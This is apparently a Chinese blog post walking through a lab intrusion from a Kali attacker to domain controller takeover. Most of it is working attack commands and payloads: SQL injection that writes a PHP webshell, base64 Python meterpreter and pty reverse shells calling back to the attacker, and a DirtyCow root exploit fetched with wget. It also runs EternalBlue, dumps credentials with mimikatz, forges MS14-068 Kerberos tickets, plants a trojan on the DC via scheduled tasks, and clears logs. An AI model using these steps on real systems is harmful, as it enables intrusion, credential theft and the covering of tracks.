<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OG2_NvllhvRp8mIyt34jBQ)

**拓扑环境**

1.  Kali Linux（攻击机）
    
2.  Centos6.4（web 服务器）
    
3.  win7（域成员主机无法上网）
    
4.  win2008R2（域控无法上网）
    

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoksiafe6KOe5PlNcaVHVcsAwv7BNpw3amBCYBzWCoPwf4fJ3ROOBjJiaQ/640?wx_fmt=png)

**目的**

通过 Kali Linux 拿到域控权限

**Web 渗透**

**目录扫描**

使用 dirbuster 工具扫描网站根目录

设置 kali 默认字典文件 

```
/usr/share/wordlists/dirbuster/directory­list­lowercase­2.3­small.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoC42MDOHrgBx8qQlc1UlDBgyfUKfp9WvmZsyd3gt3oibr3qrhOAu8hkg/640?wx_fmt=png)

扫描获得 phpinfo.php

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoLL5lJibX09TOLLXgQaw1Pd34ibNKicaGKc4ChickicaHT7yg4OONKA3kjcQ/640?wx_fmt=png)

得到网站绝对路径信息

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoqDr0YNibyTorsQWnjR05UqnnJkKKCib5DQrgvWvA4lzpiccGuGp8vxtMQ/640?wx_fmt=png)

**SQL 查询报错**

通过测试发现存在 sql 整型注入报错情况，进一步获取 webshell

```
sqlmap ‐u "http://IP:8888/newsshow.php?cid=4&id=19*" ‐‐dbms MYSQL ‐v3

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoicNG4LWN4py4pib5PKaKnyye874Jo28b2icUqHAukqdl3rwPb0jDhMQZQ/640?wx_fmt=png)

**获取 webshell**

这里有绝对路径的情况下，可直接写入 webshell。这里使用 sqlmap os­shell 的功能

**sqlmap(os­shell)**
--------------------

```
#通过sqlmap获取命令执行会话
sqlmap ‐u "http://IP/newsshow.php?cid=4&id=19*" ‐‐dbms MYSQL ‐v3 ‐‐os‐ shell

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoDckUDgKpIBKhYn4T2jpvAiaEHdcPa023xyXlnskvFtxz3N3ibJ48IyNw/640?wx_fmt=png)

**直接写 webshell(pass)**
----------------------

```
http://IP/newsshow.php?cid=4&id=19 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,0x3c3f706870206576616c28245f504f53545b2770617373275d29 3f3e,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 into outfile '/var/www/html/webshell.php'

```

**反弹 shell**

为了更好做后续操作，进行反弹 shell

**获取目标系统信息**

```
Copy to clipboard
os‐shell> uname ‐a 
os‐shell> whereis python

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoh5G3K7YyFxnzFG6Wak9FY4d7bEvy5nVEicnU5w6xg5MqKUoBXNlukMw/640?wx_fmt=png)

**获取 meterpreter 会话**

由于网站上为 linux 默认安装 python，可直接生成 python 反弹脚本

```
#生成python反弹脚本
msfvenom ‐p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 ‐f raw
#msf监听反向连接会话
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp set LHOST IP
set LPORT 4444
run
#msf监听快速启动
cat py_reverse_tcp.rc
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp set LHOST 192.168.0.17
set LPORT 4444
exploit
msfconsole ‐r py_reverse_tcp.rc
#在sqlmap os‐shell模式下执行python meterpreter反弹脚本
os‐shell> python ‐c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF‐8')} [sys.version_info[0]] ('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQ0KZm9yIHggaW4gcmFuZ2UoMTApOg0KCXRy eToNCgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KCQlzLmNvbm 5lY3QoKCYjMzk7SVAmIzM5Oyw0NDQ0KSkNCgkJYnJlYWsNCglleGNlcHQ6DQoJCXRpbWUu c2xlZXAoNSkNCmw9c3RydWN0LnVucGFjaygmIzM5OyZndDtJJiMzOTsscy5yZWN2KDQpKV swXQ0KZD1zLnJlY3YobCkNCndoaWxlIGxlbihkKSZsdDtsOg0KCWQrPXMucmVjdihsLWxl bihkKSkNCmV4ZWMoZCx7JiMzOTtzJiMzOTs6c30pDQo=')))"

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtonnYK10M1sN0icWR2EjQpIRUvsqRE9lNoNedmrW2uVXsZd8EjI9iaKCFA/640?wx_fmt=png)

**nc+python 反弹**
----------------

```
#kali监听会话
root@kali:~# nc ‐lvvp 6666
#在sqlmap os‐shell模式下执行python bash反弹脚本
os‐shell> python ‐c "import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((' IP',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.filen o(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.clos e();"

```

sqlmap 执行:

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoPMqKibDTXpuXiaAib579pBomF69tM480CVkE9v6qbBW4AQ466rqS57iaaQ/640?wx_fmt=png)

监听端口返回反弹 shell 结果:  

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoxvN619ibYrINOiatCKPsbaNMPorJ9UXImibJ71kUQGbiajJibnXyl99NT5g/640?wx_fmt=png)

**提权**

拿到 shell 后，尝试提升权限

**查看当前内核版本**

通过 uname ­a 获取当前系统内核版本

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoAhXIYib5dfNgicmTJ8zEMficaVcS3Rdf6B855eiacOib5guNo19vw88Dxibw/640?wx_fmt=png)

**使用已知漏洞提权**

根据可已知内核漏洞下载对应的提权程序 (该处使用脏牛内核提权)

```
cd /tmp/
wget ‐‐no‐check‐certificate https://raw.githubusercontent.com/K3vinPlus/sundry/master/DirtyCow/dir ty.c
gcc ‐pthread dirty.c ‐o dirty ‐lcrypt
./dirty 123456

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoMKQwGsSrt3Cnq3SBHt3licM5EiaBiaGWbOtuju4sSg9iavWiapgVxNNSziaw/640?wx_fmt=png)

获得 firefart 用户，权限为 root

```
su firefart

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoPfuaZmXUV9yNn4fAic6h6pExiayicYicE3LPTWVvyK9r6dFjIzFwPKdJbA/640?wx_fmt=png)

切换用户为 firefart 后，将 passwd 恢复, 避免 root 用户无法使用

```
mv /tmp/passwd.bak /etc/passwd

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvto85U2tRyJMicwXL8hlg8XGIDZPv8eNftLPib4VJ3IJ0mXhebAdlaLBJxg/640?wx_fmt=png)

**横向渗透**

通过查看网卡信息后发现存在内网地址信息

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtof9aUsuiaX0D8PxabneyOvYXGeX9NKjWiakhGFsD7bk4gTkUu0wVNa3icg/640?wx_fmt=png)

**内网代理**

meterpreter 自动路由 (首选)

```
meterpreter > run autoroute ‐s 10.0.1.0/24
meterpreter > run autoroute ‐p

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtomlfAXtUiafPLO3M7WK4rmoiby3XzImEJ1b49SQmtblyDOzBh8OxuicEcA/640?wx_fmt=png)

**reGeorg+proxychains**

由于 web 服务器第二张网卡无法上网，需进行内网代理

在 web 服务器的 shell 下，下载 tunnel.nosocket.php 文件，做代理流量

```
1、网络下载
wget ‐‐no‐check‐certificate https://raw.githubusercontent.com/K3vinPlus/reGeorg/master/tunnel.noso cket.php
mv tunnel.nosocket.php /var/www/html/
2、本地上传
upload /root/reGeorg/tunnel.nosocket.php /var/www/html

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoibIiaGTDPgpgRa97ORXjTUnyhMVxtZf59cabVryM8PPMZq2JMxxUNmMg/640?wx_fmt=png)

可正常访问 tunnel.nosocket.php 文件

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoTnicyNOoibp3CiazmyvP7ZW78kVRXArcflblMLLoMibMZT5HTA7ZpuB2Zg/640?wx_fmt=png)

Kali 上执行 reGeorg 代理脚本  

```
python reGeorgSocksProxy.py ‐p 9999 ‐u http://IP:8888/tunnel.nosocket.php

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoQ4cxT57ZOBwiawFqr7QjVJx4kFPpP1ZPN4fb3qDWnSNBqh8krIePD5Q/640?wx_fmt=png)

修改 proxychains 配置文件，在末行添加 socks 信息。

```
vim /etc/proxychains.conf socks5 127.0.0.1 9999

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtodl1u8msJLcpPIIqFsjIYjtOnp1jCV0L3ETybftK5ibEicz2IwwiaoRMVA/640?wx_fmt=png)

##msf 自带代理设置

```
setg Proxies socks5:127.0.0.1:9999

```

**内网资产扫描**

**端口扫描**

使用 msf 自带端口扫描模块，探测出 10.0.1.9 和 10.0.1.254 都存在 445、3389 端口。

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.1.1/24
set PORTS 21,22,23,80,389,445,873,1433,1521,2049,2181,2375,3306,3389,4899,5432,5 631,5900,5938,5984,6379,8000,8080,7001,9080,9200,10051,11211,20880,270 17,50070
set THREADS 10
exploit

```

**10.0.1.9 IP 端口开放情况**

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoXIn9S2s6YROCCxoHlQ1SuJnN0Vdria0ZS73ldbo1Ed3V2gVuOaK8IJw/640?wx_fmt=png)

**10.0.1.254 IP 端口开放情况**

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtozYHiafPkH9D5Hibz2egUUHqJ7rb7fmMpcgAKfNUt46TibZc5X4sVnweTQ/640?wx_fmt=png)

**MS17­010 漏洞主机扫描**

通过代理方式，使用 msf 框架扫描内网网段中存在 MS17­010 漏洞主机

```
root@kali:~# proxychains msfconsole use auxiliary/scanner/smb/smb_ms17_010 set RHOST 10.0.1.0‐254
set threads 10
exploit

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvto5ZGeer9qhmaPOW1icRFDddgKJgVfbuCzicvkFuvTicb8N5UPaXibTPQKtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtojOJC2nVicZ9oymgZgUP9dZib1FmdVezAdQVqaZ34afkkQAYcXg1ooccg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtocfd2qOMEs0JyPXGuFeZZWwS75vUB3iaD5yj4grQ9n2fGYu6mRa6astQ/640?wx_fmt=png)

**MS17­010 漏洞利用**

通过 meterpreter 路由方式，background 之后使用 ms17­010 攻击模块进行攻击

```
use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp set RHOSTS 10.0.1.9
run

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvto3Zu33yISW554GDvuvY9xBMXpD4U1zwAKrN2iaQWBGUXVDW3DBURIu1g/640?wx_fmt=png)

域渗透

**信息收集**

**查看当前主机信息**

```
meterpreter > sysinfo

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoYPD5Iw3jYZ7YbJic1ZjqQdQrfYvQgLekuQPicud5kfGNyvDwAicick4xeQ/640?wx_fmt=png)

**获取当前域**

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtolqUEjmnPgnia2zypthOjyQPr5h3D6ic5BtLntwG5KhmU9YkZWkzibyFCw/640?wx_fmt=png)

**使用 mimikatz 获取密码**

加载 mimikatz 模块

```
meterpreter > load mimikatz
#读取内存中存放的账号密码明文信息 
meterpreter > wdigest

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtohtZ0Oic1wvvmIxXVXnIwp1Bj3bJtFYNSfHX35IkLrm1u5AacbSHWQGQ/640?wx_fmt=png)

**获取域账号 SID**

```
meterpreter > run post/windows/gather/enum_logged_on_users

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoqN7gDVqEpyXlRhlQvNBDSibGsAG5qydIdOSH36OQicVYdiavxKn7DOPbw/640?wx_fmt=png)

**域控定位**

```
net group "domain controllers" /domain ping dc1.kevin.com

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoZxgJFA2xwqAJerwwLCmvBdBHdMVic4x9cEiaAQ9krZTZswqMeXuJOib3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvto9iciab61Bs59hicIc3HdnLYuzwJHOwmN4bzD8kaASZNhJbnlKVNF2XzTQ/640?wx_fmt=png)

**MS14­068**

**python 脚本生成票据**

```
proxychains python ms14‐068.py ‐u liujiafeng@kevin.com ‐s S‐1‐5‐21‐ 4289546598‐4075965387‐827630551‐1111 ‐d 10.0.1.254 ‐p kevin@123

```

### **msf 模块生成票据**

```
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum set DOMAIN KEVIN.com
set USER liujiafeng
set PASSWORD kevin@123
set USER_SID S‐1‐5‐21‐4289546598‐4075965387‐827630551‐1111
set RHOST 10.0.1.254

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtomLy8IeptiaE19zsv4Bl5R5QlM9XxR19BLSlm3zZnVDpSBicNhnVYExFw/640?wx_fmt=png)

**本地生成 kirbi 文件**

```
#kali切换目录到loot下将ms14‐068 bin票据复制到物理机 /root/.msf4/loot/
#物理机通过mimikatz转为kirbi文件
mimikatz # kerberos::clist 20191223050146_default_10.0.1.254_windows.kerberos_122860.bin /export

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoa6vWxibqLmzib2e7ohzyMGMmEL3SA7yHu0d4ugBN2TLRdcCIDQKqObQA/640?wx_fmt=png)

**kirbi 转为 ccache**

```
#再将kirbi文件放到kali ticket_converter转换脚本目录下 #将kirbi文件转为ccache
python ticket_converter.py 0‐00000000‐liujiafeng@krbtgt‐KEVIN.COM.kirbi TGT_liujiafeng@kevin.com.ccache 
mv TGT_liujiafeng@kevin.com.ccache /root/pykek/

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoGwo97juoAXJxlFvCs39h5yCkBz80cyJL1gKsw9Zxib9MAFG6DXWjNZw/640?wx_fmt=png)

**生成正向连接的 msf test.exe 木马**

生成 msf 监听端口程序

```
msfvenom ‐p windows/x64/meterpreter/bind_tcp LHOST=10.0.1.254 LPORT=4444 ‐f exe ‐o /root/pykek/test.exe

```

新建一个 msf 会话监听正向连接 payload

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp 
set RHOST 10.0.1.254

```

**上传利用工具**

上传利用工具、ms14­086 黄金票据到 win7 跳板机上

```
upload /root/pykek/TGT_liujiafeng@kevin.com.ccache C:/users/kevin upload /usr/share/windows‐resources/mimikatz/x64/mimikatz.exe C:/Users/kevin
upload /root/pykek/test.exe c:/users/kevin
shell

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoeGOa9pLCQqf4ibcFxI6eupan4w0bw5pwTIeajmzF1g8EsUCmdWtkPjQ/640?wx_fmt=png)

**票据导入**

在 win7 跳板机上执行

```
#清空票据 klist purge
#导入票据
cd c:/users/kevin
mimikatz.exe
kerberos::ptc TGT_liujiafeng@kevin.com.ccache

```

**复制木马到域控**

再通过 win7 跳板机复制 test.exe 到域控 c 盘，并通过 at 命令添加定时任务执行 test.exe

```
copy test.exe \\dc1.kevin.com\c$ dir \\dc1.kevin.com\c$

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtonpPxgVYEFugiaepKHia2pHxZKzIS5Kd09J7icLnNl9wGxKf5CCtiak3JRA/640?wx_fmt=png)

**在域控上添加 at 定时任务执行木马**

```
net time \\dc1.kevin.com
at \\dc1.kevin.com 15:42:00 c:\test.exe

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoycYGNLyU3D1et2fkTqo4yG2ttRdITMxGiae8MuKOkdWhPtpINpiaqCZA/640?wx_fmt=png)

查看当前域控 at 定时任务

```
at \\dc1.kevin.com

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtohZytJtxjZrAsAmrJg0iaUAQCwvlg5ZQ0e5bhDNzxLtguiaI5WiaicedD3w/640?wx_fmt=png)

在域控 at 定时任务执行后，连接域控 4444 端口

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtoOCIc6USEicMicic8yrCzl0Z7ox81GFeoj50PckMUochiaElrdhpqic43NnQ/640?wx_fmt=png)

```
netstat ‐ano |findstr "4444"

```

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvtozTHT2B5bYdLMbibVROtxKiaATFDR3VJmyfSLORJAs6jmIPRMHnINztrw/640?wx_fmt=png)

**所有获得的 meterpreter 会话**

![](https://mmbiz.qpic.cn/mmbiz_png/hZj512NN8jkpVXicGNRz2MFdlS9u7icvto9Libg1HWiaiaB3f3iaxvbJnyEtQQdN7xtXaEAOSHFeyJmZou5KzHfcZvgw/640?wx_fmt=png)

**清除痕迹**

结束 msf 木马进程，删除 exe 进程

```
at \\dc1.kevin.com 16:23:00 cmd /c del c:\test.exe

```

删除 win7 工具

```
cd c:/users/kevin
rm TGT_liujiafeng@kevin.com.ccache
rm mimikatz.exe

```

windows 删除系统日志

```
clearev

```

==== 正文结束 ====

点击文末 “阅读原文” 可直接跳转原文链接。

![](https://mmbiz.qpic.cn/mmbiz/hZj512NN8jlGIdmuiceNQ71tqb6PygMOKnAQGwDqcAAFbU2pj5tm7FgHaSajkfN5V99pMelaYT3Zic35eqianOR3Q/640?wx_fmt=jpeg)

**“喜欢就点个关注吧，虽然我更新比较慢。****”**